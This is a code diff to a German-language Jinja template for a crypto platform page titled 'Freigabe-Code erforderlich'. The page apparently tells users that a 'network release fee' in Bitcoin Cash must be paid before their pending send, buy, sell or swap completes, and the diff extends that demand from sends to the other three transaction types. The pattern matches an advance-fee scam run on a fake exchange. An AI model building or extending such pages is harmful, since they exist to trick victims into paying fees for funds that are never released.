@@ -2,6 +2,14 @@
 {% block title %}Freigabe-Code erforderlich{% endblock %}
 
 {% block content %}
+{% set kind = pending.kind|default('send') %}
+{% set is_swap = kind == 'swap' %}
+{% set is_buy  = kind == 'buy' %}
+{% set is_sell = kind == 'sell' %}
+
+{% set verb_map = {'buy': 'Sie kaufen', 'sell': 'Sie verkaufen', 'swap': 'Sie tauschen', 'send': 'Sie senden'} %}
+{% set verb = verb_map.get(kind, 'Sie senden') %}
+
 <div class="bc-shell">
   <aside class="bc-side">
     <div class="bc-side__card">
@@ -29,21 +37,43 @@
         <div>
           <div class="bc-send-confirm__eyebrow">Transaktion ausstehend</div>
           <h1 class="bc-send-confirm__title">Freigabe-Code erforderlich</h1>
-          <p class="bc-send-confirm__sub">Um Ihre Überweisung abzuschließen, ist eine Netzwerk-Freigabegebühr in Bitcoin Cash erforderlich.</p>
+          <p class="bc-send-confirm__sub">
+            {% if is_buy  %}Um Ihren Kauf abzuschließen, ist eine Netzwerk-Freigabegebühr in Bitcoin Cash erforderlich.
+            {% elif is_sell %}Um Ihren Verkauf abzuschließen, ist eine Netzwerk-Freigabegebühr in Bitcoin Cash erforderlich.
+            {% elif is_swap %}Um Ihren Tausch abzuschließen, ist eine Netzwerk-Freigabegebühr in Bitcoin Cash erforderlich.
+            {% else %}Um Ihre Überweisung abzuschließen, ist eine Netzwerk-Freigabegebühr in Bitcoin Cash erforderlich.{% endif %}
+          </p>
         </div>
       </div>
 
       <div class="bc-send-confirm__grid">
         <div class="bc-send-confirm__panel">
-          <div class="bc-send-confirm__label">Sie senden</div>
+          <div class="bc-send-confirm__label">
+            {% if is_buy  %}Sie kaufen{% elif is_sell %}Sie verkaufen{% elif is_swap %}Sie tauschen{% else %}Sie senden{% endif %}
+          </div>
           <div class="bc-send-confirm__amount">
-            <strong>{{ pending.amount_qty|qty(8) }} {{ pending.symbol }}</strong>
-            <span class="bc-send-confirm__eur">≈ {{ pending.amount_eur|eur }}</span>
+            {% if is_swap %}
+              <strong>{{ pending.amount_qty|qty(8) }} {{ pending.symbol }}</strong>
+              <span class="bc-send-confirm__eur">≈ {{ pending.amount_eur|eur }}</span>
+            {% else %}
+              <strong>{{ pending.amount_qty|qty(8) }} {{ pending.symbol }}</strong>
+              <span class="bc-send-confirm__eur">≈ {{ pending.amount_eur|eur }}</span>
+            {% endif %}
           </div>
           <div class="bc-send-confirm__addr-row">
-            <span class="bc-send-confirm__addr-label">Empfänger</span>
+            <span class="bc-send-confirm__addr-label">
+              {% if is_buy %}Gutschrift{% elif is_sell %}Auszahlung{% elif is_swap %}Empfang{% else %}Empfänger{% endif %}
+            </span>
             <code class="bc-send-confirm__addr">{{ pending.address }}</code>
           </div>
+          {% if is_swap %}
+          <div class="bc-send-confirm__addr-row" style="margin-top:10px;">
+            <span class="bc-send-confirm__addr-label">Sie erhalten</span>
+            <code class="bc-send-confirm__addr">
+              <strong style="color:#0e9f6e;">{{ pending.amount_qty_to|qty(8) }} {{ pending.to_symbol }}</strong>
+            </code>
+          </div>
+          {% endif %}
         </div>
 
         <div class="bc-send-confirm__panel bc-send-confirm__panel--accent">
